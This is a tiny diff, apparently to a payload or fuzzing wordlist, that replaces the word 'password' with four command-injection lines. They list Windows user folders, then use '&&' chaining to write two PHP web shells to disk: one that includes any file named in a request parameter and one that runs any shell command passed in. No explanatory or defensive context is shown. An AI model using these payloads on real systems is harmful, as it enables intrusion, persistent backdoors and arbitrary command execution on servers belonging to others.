@@ -1,1 +1,4 @@
-password
+dir C:\Documents and Settings\*
+&& dir C:\Users
+&& echo "<?php include($_GET['page']); ?>" > rfi.php
+&& echo "<?php system($_GET['cmd']); ?>" > cmd.php
